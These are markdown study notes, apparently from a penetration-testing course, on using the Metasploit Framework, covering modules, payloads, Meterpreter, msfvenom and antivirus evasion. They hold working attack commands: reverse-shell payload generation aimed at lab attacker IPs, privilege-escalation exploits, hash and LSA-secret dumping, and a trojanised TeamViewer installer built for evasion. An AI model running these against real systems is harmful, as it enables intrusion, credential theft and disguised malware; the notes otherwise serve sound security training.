---

mindmap-plugin: basic

---

# Using the Metasploit Framework
## Modules

#### **1. Purpose of Metasploit Modules**
- **Automated Exploits:** Metasploit modules are pre-built scripts designed for exploiting vulnerabilities.
- **Customization Needs:** Not all exploits work out of the box; they may require customization based on the target environment.
- **Support Tool:** Metasploit should be viewed as a supplementary tool, not a replacement for manual penetration testing skills.

### **2. Module Structure**

#### **2.1. Syntax of Modules**
- **Format:** `<No.> <type>/<os>/<service>/<name>`
- **Example:** `794 exploit/windows/ftp/scriptftp_list`
- **Components:**
  - **No.:** Index number for quick module selection.
  - **Type:** Describes the module's purpose (e.g., Exploit, Auxiliary, Post).
  - **OS:** Specifies the operating system the module targets.
  - **Service:** Refers to the specific service or functionality the module targets.
  - **Name:** Indicates the action performed by the module.

#### **2.2. Module Types**
- **Auxiliary:** Scanning, fuzzing, sniffing, and admin capabilities.
- **Encoders:** Ensure payload integrity.
- **Exploits:** Modules that exploit vulnerabilities to deliver payloads.
- **NOPs:** Keep payload sizes consistent.
- **Payloads:** Code that runs remotely and establishes connections to the attacker's machine.
- **Plugins:** Additional scripts integrated within Metasploit.
- **Post:** Modules used after exploitation for gathering information and further penetration.

### **3. Searching for Modules**

#### **3.1. Search Functionality**
- **Command:** `search <options> <keywords>:<value>`
- **Options:**
  - **-o:** Output results to a file.
  - **-S:** Filter results using a regex pattern.
  - **-s:** Sort results based on a column.
- **Keywords:** `cve`, `platform`, `rank`, `type`, etc.
- **Example Searches:**
  - **EternalRomance Exploit:** `search eternalromance type:exploit`
  - **Specific CVE and Platform:** `search type:exploit platform:windows cve:2021 rank:excellent microsoft`

### **4. Module Selection**

#### **4.1. Selecting Modules**
- **Using Index No.:** Use the index number from the search results to quickly load a module.
- **Command:** `use <No.>`
- **Options:** Use `show options` to see what needs to be configured before running the exploit.

### **5. Using Modules**

#### **5.1. Customizing Modules**
- **Setting Targets:** Use the `set` command to specify target details (e.g., `RHOSTS`, `LHOST`).
- **Permanent Settings:** Use `setg` to set global options that persist across different modules.
- **Example:** `set RHOSTS 10.10.10.40`

#### **5.2. Running the Exploit**
- **Command:** `run`
- **Outcome:** Executes the exploit, potentially providing a shell on the target machine.

### **6. Interaction with Exploited Target**

#### **6.1. Post-Exploitation Interaction**
- **Command:** `shell` or `meterpreter` commands.
- **Example Interaction:** Using `whoami` to confirm access level.

## Metasploit Target Selection Overview

#### **1. Understanding Targets**

- **Definition:** Targets are unique operating system identifiers that help tailor an exploit module to run on specific versions of an operating system.
- **Display Targets:** The `show targets` command in an exploit module displays all available vulnerable targets for that specific exploit.
- **Selecting Targets:** The `set target <index no.>` command allows users to select a specific target from the available options.

### **2. Target Selection Process**

#### **2.1. Viewing Targets in an Exploit Module**
- **Example Module:** `ms17_010_psexec`
  - Displays options like `RHOSTS`, `RPORT`, and payload settings.
  - **Exploit Target:** The default is set to "Automatic," meaning the system will attempt to determine the target automatically.

#### **2.2. Detailed Target Example**
- **Exploit Example:** MS12-063 (Microsoft Internet Explorer execCommand Use-After-Free Vulnerability)
  - **Target Options:**
    - Automatic
    - IE 7 on Windows XP SP3
    - IE 8 on Windows XP SP3
    - IE 7 on Windows Vista
    - IE 8 on Windows Vista
    - IE 8 on Windows 7
    - IE 9 on Windows 7
  - **Info Command:** Provides details about the exploit, its functionality, and the vulnerable targets.

### **3. Using the Info Command**

- **Purpose:** The `info` command provides in-depth information about the module, including the exploit's origin, affected versions, and its functionality.
- **Best Practice:** Always use the `info` command when working with a new module to understand its behavior and ensure a clean working environment.

### **4. Selecting Specific Targets**

#### **4.1. Using Automatic Target Selection**
- **Default:** Selecting "Automatic" allows Metasploit to perform service detection and choose the best target automatically.

#### **4.2. Manually Selecting a Target**
- **Command:** `set target <index no.>`
- **Example:** Selecting target 6 (IE 9 on Windows 7) for the MS12-063 exploit.

### **5. Target Types and Variability**

#### **5.1. Factors Influencing Target Types**
- **Service Pack, OS Version, Language Version:** Targets may vary based on these factors, affecting the return address and other parameters in the exploit module.

#### **5.2. Return Addresses**
- **Variability:** Return addresses can vary due to different language packs, software versions, or the presence of hooks.
- **Examples:** `jmp esp`, `pop/pop/ret`, or jumps to specific registers.

#### **5.3. Identifying Targets**
- **Steps:**
  - Obtain a copy of the target binaries.
  - Use `msfpescan` to locate a suitable return address.
- **Further Exploration:** The module will delve deeper into exploit development, payload generation, and target identification later.

## Payloads

#### **1. Understanding Payloads**

- **Definition:** A payload in Metasploit is a module that works in conjunction with an exploit to return a shell or perform another task on the target system.
- **Types of Payloads:**
  - **Single:** Self-contained payloads that execute an action independently.
  - **Stagers:** Set up a connection between the attacker and the victim, typically used to receive larger stages.
  - **Stages:** The larger payload that is executed after the stager, providing advanced features like Meterpreter.

#### **2. Types of Payloads**

##### **2.1. Singles**
- **Description:** Contains both the exploit and the shellcode, providing immediate execution on the target system. However, they can be large in size and may not be supported by all exploits.
- **Examples:** Adding a user or starting a process on the target system.

##### **2.2. Stagers**
- **Description:** Works with stages to establish a network connection. They are designed to be small and reliable, facilitating the connection setup between the attacker and the victim.
- **Examples:**
  - **NX vs. NO-NX Stagers:** NX stagers are larger due to added reliability features like DEP (Data Execution Prevention) compatibility.

##### **2.3. Stages**
- **Description:** These are downloaded by stagers and provide advanced features without size constraints. Examples include Meterpreter, VNC Injection, etc.
- **Staged Payloads:** A combination of stagers and stages to modularize and chain the attack.

#### **3. Meterpreter Payload**

- **Definition:** A multi-faceted payload that uses DLL injection for a stable and stealthy connection to the victim's host.
- **Features:**
  - Resides entirely in memory, leaving no traces on the hard drive.
  - Offers a wide range of commands for post-exploitation tasks, such as keystroke capture, password hash collection, and more.
  - Dynamic loading/unloading of scripts and plugins.

#### **4. Searching for Payloads**

- **Command:** `show payloads` to list available payloads.
- **Example:** Searching for a Meterpreter payload for Windows 7(x64) using `grep` for filtering specific terms like `meterpreter` and `reverse_tcp`.
- **Selection:** Use the `set payload <no.>` command after selecting an exploit module.

#### **5. Payload Types and Usage**

##### **5.1. Common Payloads for Windows**
- **Examples:**
  - **generic/shell_bind_tcp:** Generic listener with TCP binding.
  - **windows/x64/shell_reverse_tcp:** Reverse TCP shell for Windows x64.
  - **windows/x64/meterpreter/reverse_tcp:** Meterpreter with reverse TCP connection.
  - **windows/x64/powershell:** Interactive PowerShell sessions.

##### **5.2. Specialized Payloads**
- **Empire and Cobalt Strike:** Advanced payloads used by professional penetration testers (not covered in detail here).

#### **6. Setting Payload Parameters**

- **Example Configuration:**
  - **Exploit Parameters:** `RHOSTS` for the target IP, `RPORT` for the service port (e.g., 445 for SMB).
  - **Payload Parameters:** `LHOST` for the attacker's IP, `LPORT` for the listening port.

#### **7. Meterpreter Commands Overview**

- **Core Commands:** Managing sessions, channels, and executing scripts.
- **File System Commands:** Navigating and manipulating files and directories.
- **Networking Commands:** Viewing network configurations, forwarding ports, etc.
- **System Commands:** Interacting with processes, environment variables, and system information.
- **User Interface Commands:** Capturing screenshots, keystrokes, and controlling the remote desktop.
- **Webcam Commands:** Managing webcam streams and snapshots.

#### **8. Selecting and Running Payloads**

- **Process:**
  1. Select the exploit and payload using `show payloads`.
  2. Set the necessary parameters like `RHOSTS`, `LHOST`, etc.
  3. Execute the payload with the `run` command.
- **Example Output:** The output might show the establishment of a Meterpreter session, from which various commands can be executed to control the target system.


## Encoders

#### **1. Overview of Encoders**

- **Purpose:** Over the 15 years of existence of the Metasploit Framework, encoders have been essential in making payloads compatible with different processor architectures and aiding in antivirus evasion. They modify payloads to run on various operating systems and architectures, such as:
  - `x64`, `x86`, `sparc`, `ppc`, `mips`
- **Functionality:** Encoders are used to remove hexadecimal opcodes, known as bad characters, from payloads. They also play a role in encoding payloads into different formats, which can help with AV evasion. However, their effectiveness for AV evasion has diminished over time due to improved protection mechanisms.

#### **2. Shikata Ga Nai (SGN) Encoder**

- **Popularity:** Shikata Ga Nai (SGN) is one of the most widely used encoding schemes. It was once very effective at evading detection, making encoded payloads nearly undetectable. The name (仕方がない) translates to "It cannot be helped" or "Nothing can be done about it."
- **Current Relevance:** While SGN was highly effective a few years ago, its effectiveness has decreased as protection systems have evolved. Nonetheless, SGN remains a popular choice in certain scenarios.

#### **3. Selecting an Encoder**

##### **3.1. Historical Tools: `msfpayload` and `msfencode`**

- **Before 2015:** The Metasploit Framework used two separate tools, `msfpayload` and `msfencode`, to handle payload creation and encoding. These tools were located in `/usr/share/framework2/`.
- **Usage Example:** `msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai`

##### **3.2. msfvenom Integration**

- **After 2015:** The functionality of `msfpayload` and `msfencode` was combined into the `msfvenom` tool, simplifying payload generation and encoding.
- **Usage Example:** `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl`

#### **4. Generating Payloads with Encoders**

##### **4.1. Generating a Payload Without Encoding**

- **Example Command:** `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl`

##### **4.2. Generating a Payload with Encoding**

- **Example Command:** `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai`

#### **5. Compatibility and Selection of Encoders**

##### **5.1. Checking Available Encoders**

- **Command:** To check available encoders for your selected payload, use `show encoders` in `msfconsole`.

##### **5.2. Example with EternalBlue Exploit**

- **Setting the Payload:** `msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp`
- **Showing Compatible Encoders:** `msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders`

#### **6. Advanced Encoding Techniques**

##### **6.1. Multiple Iterations of Encoding**

- **Example Command:** `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe`

## Databases
#### **1. Introduction to Databases in Metasploit**

- **Purpose:** Databases in Metasploit are used to manage and keep track of results during complex assessments. They allow for organizing information such as discovered vulnerabilities, credentials, and scan results, making it easier to manage extensive engagements.
- **Integration:** Metasploit uses PostgreSQL as its backend database, providing a robust system for storing and retrieving data related to assessments.

#### **2. Setting Up the Database**

**2.1. Checking PostgreSQL Status**
- **Command:** To check if the PostgreSQL service is running: `sudo service postgresql status`

**2.2. Starting PostgreSQL**
- **Command:** To start the PostgreSQL service: `sudo systemctl start postgresql`

**2.3. Initializing the Database**
- **Command:** To initialize the MSF database: `sudo msfdb init`
- **Troubleshooting:** If errors occur during initialization, updating Metasploit (`apt update`) and reinitializing the database may resolve the issue.

**2.4. Connecting to the Database**
- **Command:** To start msfconsole and connect to the database: `sudo msfdb run`
- **Verifying Connection:** `msf6 > db_status`

#### **3. Using the Database**

**3.1. Workspace Management**
- **Purpose:** Workspaces in Metasploit are like folders that help organize scan results, hosts, and other assessment data by IP range, domain, or other criteria.
- **Commands:**
  - **List Workspaces:** `msf6 > workspace`
  - **Create Workspace:** `msf6 > workspace -a <workspace_name>`
  - **Switch Workspace:** `msf6 > workspace <workspace_name>`

**3.2. Importing Scan Results**
- **Command:** To import scan results into the database: `msf6 > db_import <filename.xml>`
- **Viewing Imported Data:**
  - **Hosts:** `msf6 > hosts`
  - **Services:** `msf6 > services`

**3.3. Running Nmap Scans**
- **Command:** To run Nmap directly within msfconsole: `msf6 > db_nmap <options> <target>`

**3.4. Data Backup**
- **Command:** To export database contents: `msf6 > db_export -f xml <backup_filename.xml>`

#### **4. Detailed Commands for Managing Data**

**4.1. Hosts**
- **Purpose:** Manage and view hosts discovered during assessments.
- **Command Example:** `msf6 > hosts -h`

**4.2. Services**
- **Purpose:** Manage and view services discovered during scans.
- **Command Example:** `msf6 > services -h`

**4.3. Credentials**
- **Purpose:** Manage and view credentials gathered during the assessment.
- **Command Example:** `msf6 > creds -h`

**4.4. Loot**
- **Purpose:** View and manage collected data such as password hashes, configuration files, and other sensitive information.
- **Command Example:** `msf6 > loot -h`
## Plugins and Mixins

#### **1. Overview of Plugins**

- **Definition:** Plugins are third-party software integrated into the Metasploit Framework, either as commercial products with limited free editions or individual projects. They extend the functionality of Metasploit by automating tasks, adding new commands, and simplifying workflows.
- **Purpose:** Plugins bring well-known software functionality into Metasploit, enabling seamless interaction with databases, hosts, services, and vulnerabilities, all within the Metasploit environment.

#### **2. Using Plugins**

##### **2.1. Plugin Directory**

- **Location:** The default directory for Metasploit plugins is `/usr/share/metasploit-framework/plugins`.
- **Command Example:** `ls /usr/share/metasploit-framework/plugins`  
  This command lists available plugins in the directory.

##### **2.2. Loading a Plugin**

- **Process:** If a plugin is installed correctly, it can be loaded into `msfconsole` and will be ready to use.
- **Command Example:** `msf6 > load nessus`  
  This loads the Nessus plugin and makes its commands available.

##### **2.3. Plugin Command Help**

- **Usage:** After loading a plugin, use the help command to see available commands and their descriptions.
- **Command Example:** `msf6 > nessus_help`  
  This lists the commands available in the Nessus plugin.

##### **2.4. Error Handling**

- **Scenario:** If a plugin is not installed correctly, attempting to load it will result in an error.
- **Command Example:** `msf6 > load Plugin_That_Does_Not_Exist`  
  This will show an error if the plugin is not found.

#### **3. Installing New Plugins**

##### **3.1. Adding Plugins from the Parrot OS Repository**

- **Process:** Popular plugins are installed with each Parrot OS update. Custom plugins not included in updates can be manually installed by placing the `.rb` file in the plugin directory.
- **Directory:** `/usr/share/metasploit-framework/plugins`

##### **3.2. Installing Custom Plugins**

- **Example:** To install DarkOperator’s Metasploit-Plugins, clone the repository and place the `.rb` files in the plugin directory.
- **Command Example:** `git clone https://github.com/darkoperator/Metasploit-Plugins`
- **Command Example:** `sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb`  
  This copies the `pentest.rb` plugin to the appropriate directory.

##### **3.3. Verifying Installation**

- **Process:** After copying the plugin, launch `msfconsole` and load the plugin to verify installation.
- **Command Example:** `msf6 > load pentest`  
  This loads the `pentest` plugin and verifies its successful installation.

#### **4. Popular Plugins**

- **Examples:** 
  - **nMap** (pre-installed)
  - **NexPose** (pre-installed)
  - **Nessus** (pre-installed)
  - **Mimikatz** (pre-installed V.1)
  - **Stdapi** (pre-installed)
  - **Railgun**
  - **Priv**
  - **Incognito** (pre-installed)
  - **Darkoperator’s**

#### **5. Mixins in Metasploit Framework**

##### **5.1. Overview of Mixins**

- **Definition:** Mixins are classes in Ruby that provide methods for other classes without requiring inheritance. They add flexibility by allowing features to be used across multiple classes.
- **Usage:** Mixins are typically used to provide optional features for a class or to apply a single feature to multiple classes.

##### **5.2. Implementation**

- **Ruby Modules:** In Ruby, Mixins are implemented using the `include` keyword, followed by the module name.
- **Purpose:** Mixins are integral to the customization and flexibility of the Metasploit Framework, though beginners may not need to focus on them initially.


## Sessions & Jobs
#### **1. Overview of Sessions**

- **Definition:** MSFconsole can manage multiple modules simultaneously using Sessions, which provide dedicated control interfaces for all deployed modules. Sessions allow users to switch between different modules and manage their connections to target hosts.
- **Persistence:** Once a session is backgrounded, it continues to run, maintaining a persistent connection to the target host unless interrupted by runtime issues.

#### **2. Using Sessions**

##### **2.1. Backgrounding a Session**

- **Process:** While running exploits or auxiliary modules that form a communication channel with the target host, sessions can be backgrounded using a key combination or a command.
- **Command Example:** Press `[CTRL] + [Z]` or type `background` to background a session.

##### **2.2. Listing Active Sessions**

- **Purpose:** To view all currently active sessions.
- **Command Example:** `msf6 > sessions`  
  This command lists all active sessions along with their details.

##### **2.3. Interacting with a Session**

- **Process:** To interact with a specific session, use the `sessions -i [no.]` command.
- **Command Example:** `msf6 > sessions -i 1`  
  This command starts interaction with session 1.

##### **2.4. Running Additional Modules on an Active Session**

- **Process:** Background the current session and search for another module to run. Select the session number on which the module should run from the module’s options menu.
- **Example:** Useful for post-exploitation modules such as credential gatherers, local exploit suggesters, and internal network scanners.

#### **3. Managing Jobs**

##### **3.1. Using the Jobs Command**

- **Purpose:** To manage tasks running in the background and free up resources like ports for other modules.
- **Command Example:** `msf6 > jobs -h`  
  This command displays the help menu for job management.

##### **3.2. Running an Exploit as a Background Job**

- **Process:** Add `-j` to the exploit command to run it as a background job.
- **Command Example:** `msf6 > exploit -j`  
  This command runs the exploit as a background job.

##### **3.3. Listing and Terminating Jobs**

- **Purpose:** To list all running jobs and terminate specific or all jobs.
- **Command Example:** 
  - List jobs: `msf6 > jobs -l`
  - Kill all jobs: `msf6 > jobs -K`
  - Kill a specific job: `msf6 > kill [index no.]`


## Meterpreter

#### **1. Overview of Meterpreter**

- **Definition:** Meterpreter is a multi-faceted, extensible payload that uses DLL injection to maintain a stable and difficult-to-detect connection to the victim host. It resides entirely in memory, making it challenging to detect with conventional forensic techniques.
- **Purpose:** Meterpreter enhances post-exploitation procedures by providing tools for enumeration, privilege escalation, AV evasion, vulnerability research, persistent access, and pivoting.

#### **2. Running Meterpreter**

##### **2.1. Execution Process**

- **Steps:**
  1. **Stager Execution:** The target executes the initial stager (e.g., bind, reverse).
  2. **DLL Loading:** The stager loads the DLL prefixed with Reflective.
  3. **Core Initialization:** The Meterpreter core initializes, establishes an AES-encrypted link, and configures the client.
  4. **Extension Loading:** Meterpreter loads extensions like `stdapi` and `priv` over AES encryption.

- **Command Example:** After running an exploit and successfully deploying the Meterpreter payload, you can immediately issue the `help` command to explore the capabilities of the Meterpreter shell.

##### **2.2. Example of Running a Basic Scan**

- **Command Example:** `msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15`  
  This command runs an Nmap scan against a known target and records the results in the Metasploit database.

- **Viewing Hosts:** `msf6 > hosts`  
  This command lists all discovered hosts.

- **Viewing Services:** `msf6 > services`  
  This command lists all discovered services on the target.

#### **3. Meterpreter Commands**

##### **3.1. Core Commands**

- **Purpose:** Manage the session, control channels, and interact with the Meterpreter environment.
- **Command Examples:** 
  - `meterpreter > help`  
    Displays the help menu.
  - `meterpreter > background`  
    Backgrounds the current session.
  - `meterpreter > migrate`  
    Migrates the server to another process.
  - `meterpreter > run [script]`  
    Executes a Meterpreter script or Post module.

#### **4. Stealth, Power, and Extensibility**

##### **4.1. Stealthy**

- **Description:** Meterpreter resides entirely in memory, writes nothing to the disk, and performs process migrations. Communications between the target host and attacker are encrypted using AES.

##### **4.2. Powerful**

- **Description:** Meterpreter uses a channelized communication system, allowing for secure and efficient interaction with the target host.

##### **4.3. Extensible**

- **Description:** Meterpreter’s features can be augmented at runtime, and new functionalities can be added without rebuilding it.

#### **5. Practical Use of Meterpreter**

##### **5.1. Exploiting Vulnerabilities**

- **Example:** Searching and using the `iis_webdav_upload_asp` exploit for an IIS 6.0 vulnerability.
- **Command Example:**
  - Search: `msf6 > search iis_webdav_upload_asp`
  - Use: `msf6 > use 0`
  - Configure: `msf6 > set RHOST 10.10.10.15`, `msf6 > set LHOST tun0`
  - Run: `msf6 > run`

##### **5.2. Post-Exploitation: Process Migration**

- **Command Example:** 
  - `meterpreter > getuid`  
    Displays the current user identity.
  - `meterpreter > ps`  
    Lists processes on the target.
  - `meterpreter > steal_token [PID]`  
    Steals a token from a process.

##### **5.3. Privilege Escalation**

- **Example:** Using the `ms15_051_client_copy_image` exploit to escalate privileges.
- **Command Example:**
  - Set session: `msf6 > set session 1`
  - Set LHOST: `msf6 > set LHOST tun0`
  - Run: `msf6 > run`

##### **5.4. Hash Dumping and LSA Secrets**

- **Command Example:**
  - `meterpreter > hashdump`  
    Dumps password hashes.
  - `meterpreter > lsa_dump_sam`  
    Dumps SAM database.
  - `meterpreter > lsa_dump_secrets`  
    Dumps LSA secrets.


## Writing and Importing Modules

#### **1. Installing New Metasploit Modules**

- **Updating msfconsole:** To install new modules that have been ported by other users, update `msfconsole` from the terminal. This ensures that all the latest exploits, auxiliaries, and features are installed. If the modules have been pushed into the main Metasploit-framework branch on GitHub, they will be included in the update.
- **Manual Installation:** If only a specific module is needed, download it and install it manually without performing a full upgrade.

#### **2. Searching for Modules on ExploitDB**

- **Using ExploitDB:** ExploitDB is a valuable resource for finding custom exploits. Use tags like "Metasploit Framework (MSF)" to filter scripts that are available in Metasploit module format.
- **Example Search:** 
  - **Command Example:** `msf6 > search nagios`  
    Searches for available modules related to "nagios."
  - **CLI Alternative:** Use `searchsploit` to find and download exploits directly from the command line.

#### **3. Importing Modules into Metasploit**

##### **3.1. Downloading and Placing Modules**

- **Directory Structure:** 
  - **Command Example:** `M0n0l1th6@htb$ ls /usr/share/metasploit-framework/`  
    Displays the default directory structure where all modules, scripts, and plugins are stored.
- **Copying Modules:** 
  - **Command Example:** `M0n0l1th6@htb$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb`  
    Copies the downloaded module into the appropriate directory.

##### **3.2. Loading Modules in msfconsole**

- **Load Path:** 
  - **Command Example:** `msf6> loadpath /usr/share/metasploit-framework/modules/`  
    Loads additional modules at runtime.
- **Reloading Modules:** 
  - **Command Example:** `msf6 > reload_all`  
    Reloads all modules to include the newly added ones.
  - **Using the Module:** 
    - **Command Example:** `msf6 > use exploit/unix/webapp/nagios3_command_injection`  
      Loads the specific module for use.

#### **4. Porting Over Scripts into Metasploit Modules**

##### **4.1. Adapting Custom Scripts**

- **Converting to Ruby:** To adapt a custom Python, PHP, or other types of scripts into Metasploit modules, knowledge of Ruby is required.
- **Example:** Porting the Bludit 3.9.2 Authentication Bruteforce Mitigation Bypass exploit to Metasploit.

##### **4.2. Using Boilerplate Code**

- **Example of Boilerplate Code:** 
  - **Command Example:** `M0n0l1th6@htb$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb`  
    Copies the downloaded exploit into the appropriate folder.
- **Modifying the Code:** Adjust the boilerplate code by filling in the necessary information such as module name, description, authors, and references.


## Introduction to MSFVenom

#### **1. Overview of MSFVenom**

- **Purpose:** MSFVenom is the successor of the older MSFPayload and MSFEncode tools. It combines the functionality of both tools into a single, more efficient utility for creating and encoding payloads. This makes payload generation easier and more streamlined for penetration testers.
- **Functionality:** MSFVenom generates shellcode for different processor architectures and operating systems, then encodes that shellcode to remove bad characters and evade basic AV/IPS/IDS systems.

#### **2. Creating Payloads**

- **Scenario:** Suppose an FTP server has weak credentials or allows anonymous login and is linked to a web service where files can be executed. We can use MSFVenom to generate a payload that can be uploaded to the server and executed via the web service.
- **Example Command:** 
  - **Generating a Payload:** `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx`  
    Generates an `.aspx` payload for a reverse TCP connection.

#### **3. Setting Up the Listener in msfconsole**

- **Steps:**
  1. **Start msfconsole:** 
     - **Command Example:** `msfconsole -q`
  2. **Use the multi/handler module:**
     - **Command Example:** `msf6 > use multi/handler`
  3. **Set the necessary options (LHOST, LPORT):**
     - **Command Example:** `msf6 exploit(multi/handler) > set LHOST 10.10.14.5`
     - **Command Example:** `msf6 exploit(multi/handler) > set LPORT 1337`
  4. **Run the listener:**
     - **Command Example:** `msf6 exploit(multi/handler) > run`
  
#### **4. Executing the Payload**

- **Triggering the Payload:** After setting up the listener, navigate to the URL where the `.aspx` file was uploaded to trigger the payload. This should result in a reverse shell connection back to the listener.
- **Example Command:** 
  - **Triggering the Payload:** Visit `http://10.10.10.5/reverse_shell.aspx` to execute the payload.

#### **5. Handling Meterpreter Sessions**

- **Checking Session Status:** 
  - **Example Command:** `meterpreter > getuid`  
    Checks the current user context of the Meterpreter session.
- **Issue with Session:** If the session dies often, consider using an encoder to avoid runtime errors. This increases the stability of the connection.

#### **6. Using the Local Exploit Suggester**

- **Purpose:** The Local Exploit Suggester module in Metasploit helps identify potential local privilege escalation exploits that can be run on the target system.
- **Steps:**
  1. **Search for the Local Exploit Suggester:**
     - **Command Example:** `msf6 > search local exploit suggester`
  2. **Use the Local Exploit Suggester module:**
     - **Command Example:** `msf6 > use 2376`
  3. **Set the session to be analyzed:**
     - **Command Example:** `msf6 post(multi/recon/local_exploit_suggester) > set session 2`
  4. **Run the module:**
     - **Command Example:** `msf6 post(multi/recon/local_exploit_suggester) > run`

#### **7. Running Local Privilege Escalation Exploits**

- **Example:** After using the Local Exploit Suggester, you might find an appropriate exploit like `ms10_015_kitrap0d` to escalate privileges.
- **Steps:**
  1. **Search for the exploit:**
     - **Command Example:** `msf6 exploit(multi/handler) > search kitrap0d`
  2. **Use the exploit:**
     - **Command Example:** `msf6 exploit(multi/handler) > use 0`
  3. **Set the required options (SESSION, LHOST, LPORT):**
     - **Command Example:** `msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338`
     - **Command Example:** `msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3`
  4. **Run the exploit:**
     - **Command Example:** `msf6 exploit(windows/local/ms10_015_kitrap0d) > run`

## Firewall and IDS/IPS evasion
#### **1. Introduction to Protection Mechanisms**

##### **1.1. Endpoint Protection**
- **Description:** Refers to localized device or software protection designed to defend a single host on the network, such as personal computers, corporate workstations, or servers in a DMZ.
- **Components:** Includes Antivirus Protection, Antimalware Protection (e.g., bloatware, spyware, adware), Firewall, and Anti-DDOS services.
- **Examples:** Avast, Nod32, Malwarebytes, BitDefender.

##### **1.2. Perimeter Protection**
- **Description:** Utilizes physical or virtualized devices on the network's edge, providing access from outside the network (public) to inside (private).
- **Components:** Often involves a De-Militarized Zone (DMZ) between the public internet and the internal network for housing public-facing servers.

#### **2. Security Policies**

##### **2.1. Overview**
- **Function:** Security policies dictate how traffic or files can exist within a network boundary using allow and deny statements, much like Access Control Lists (ACLs).

##### **2.2. Types of Security Policies**
- **Network Traffic Policies**
- **Application Policies**
- **User Access Control Policies**
- **File Management Policies**
- **DDoS Protection Policies**

##### **2.3. Detection Methods**
- **Signature-based Detection:** Matches network packets with pre-built attack signatures to identify threats.
- **Heuristic/Statistical Anomaly Detection:** Compares behavior against a baseline to detect deviations.
- **Stateful Protocol Analysis Detection:** Monitors protocol usage to identify deviations from accepted non-malicious activity.
- **Live-monitoring and Alerting (SOC-based):** A Security Operations Center (SOC) team monitors network activity and alerts on potential threats.

#### **3. Evasion Techniques**

##### **3.1. Overview**
- **Challenge:** Modern antivirus software and IDS/IPS systems are sophisticated, utilizing signatures, heuristic analysis, and machine learning to detect malicious activity.

##### **3.2. MSF6 and Encryption**
- **Feature:** MSF6 can tunnel AES-encrypted communication from any Meterpreter shell back to the attacker host, encrypting the traffic and mitigating network-based IDS/IPS detection.

##### **3.3. Using Executable Templates**
- **Technique:** msfvenom allows embedding payloads into executable templates, which can obfuscate the malicious code and reduce detection by antivirus software.

##### **3.4. Example Command:**
- **Generating a Backdoored Executable:**    msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

#### **4. Archiving and Obfuscation**

##### **4.1. Archiving Payloads**
- **Description:** Archiving files and adding passwords can help evade detection by antivirus software, although it might trigger alerts due to the inability to scan the archive.
- **Example Commands:**
  - **Archiving a Payload:**      rar a ~/test.rar -p ~/test.js
  - **Removing Extensions:**      mv test.rar test

##### **4.2. Checking Against VirusTotal**
- **Example Command:**    msf-virustotal -k "API key" -f test.js


#### **5. Packers**

##### **5.1. Overview**
- **Description:** Packers compress and encrypt executables, combining the payload with the original executable and decompression code to protect against file scanning mechanisms.
- **Popular Packers:** UPX, The Enigma Protector, MPRESS, Alternate EXE Packer, ExeStealth, Morphine, MEW, Themida.

#### **6. Exploit Coding and Evasion**

##### **6.1. Exploit Coding**
- **Description:** When writing or porting exploits, it's crucial to ensure the code is not easily identifiable by security measures, such as avoiding obvious patterns or NOP sleds.
##### **6.2. Recompiling Meterpreter**
- **Description:** Recompiling Meterpreter from source can help evade detection by intrusion prevention systems and antivirus engines by avoiding known signatures.
